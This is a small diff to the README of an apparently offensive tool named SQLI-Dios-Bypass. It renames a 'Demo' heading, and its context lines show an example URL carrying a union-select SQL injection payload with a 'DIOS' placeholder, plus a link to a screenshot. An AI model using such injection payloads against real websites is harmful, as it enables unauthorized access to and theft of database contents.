@@ -4,7 +4,7 @@
 ### Example
 http://example.com/page/php?id=20'union+select+1,2,3,(DIOS),5,6,7--+-
 
-## Demo
+## Demo Prove
 
 <img src="https://raw.githubusercontent.com/StarFord-NG/SQLI-Dios-Bypass/main/Screenshot_20211218-104626.png" width="450" height="380" />
 
